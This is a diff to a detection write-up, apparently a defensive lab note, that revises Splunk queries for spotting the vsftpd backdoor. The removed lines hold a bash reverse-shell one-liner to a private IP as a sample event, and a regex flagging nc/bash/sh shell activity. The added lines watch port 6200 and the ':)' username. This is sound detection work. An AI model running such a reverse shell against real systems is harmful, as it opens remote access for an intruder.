@@ -115,13 +115,19 @@ run
 
 ## 🔍 Detection Queries (Sample Splunk SPL)
 ```spl
-index=linux_logs sourcetype=syslog
-| rex field=_raw "<Data Name=\"CommandLine\">(?<CommandLine>[^<]+)</Data>"
-| rex field=_raw "<Data Name=\"ParentImage\">(?<ParentImage>[^<]+)</Data>"
-| eval is_reverse_shell=if(match(CommandLine, "(nc|bash|sh).*\\d+\.\\d+\.\\d+\.\\d+"), 1, 0)
-| eval is_vsftpd_spawn=if(like(ParentImage, "%vsftpd%") AND is_reverse_shell=1, 1, 0)
-| where is_vsftpd_spawn=1
-| table _time host CommandLine ParentImage
+  index="linux_logs"  
+| rex field=_raw "<Data Name=\"SourceIp\">(?<SourceIp>[^<]+)</Data>"
+| rex field=_raw "<Data Name=\"DestinationIp\">(?<DestinationIp>[^<]+)</Data>"
+| rex field=_raw "<Data Name=\"DestinationPort\">(?<DestinationPort>\d+)</Data>"
+| rex field=_raw "<Data Name=\"Image\">(?<Image>[^\<]+)</Data>"
+| rex field=_raw "<Data Name=\"User\">(?<User>[^\<]+)</Data>"
+| rex field=_raw "<Data Name=\"UtcTime\">(?<UtcTime>[^\<]+)</Data>"
+| eval _time=strptime(UtcTime, "%Y-%m-%d %H:%M:%S.%3N")
+| where DestinationPort="6200" OR User=":)"
+| stats count min(_time) as first_seen max(_time) as last_seen by SourceIp DestinationIp DestinationPort Image User
+| eval first_seen=strftime(first_seen, "%Y-%m-%d %H:%M:%S")
+| eval last_seen=strftime(last_seen, "%Y-%m-%d %H:%M:%S")
+| sort first_seen
 ```
 
 ## 📁 Log Fields to Monitor
@@ -137,10 +143,8 @@ index=linux_logs sourcetype=syslog
 
 ## 🧪 Sample Event
 ```text
-_time: 2025-05-23T16:01:34
-host: vulnerable-ftp
-CommandLine: bash -i >& /dev/tcp/10.0.0.15/4444 0>&1
-ParentImage: /usr/sbin/vsftpd
+SourceIp	DestinationIp	DestinationPort	Image	User	count	first_seen	last_seen
+192.168.1.11	192.168.1.3	6200	/usr/bin/ruby3.3	root	1	2025-06-01 18:02:05	2025-06-01 18:02:05
 ```
 
 ## 🕵️ Analyst Notes / Recommendations
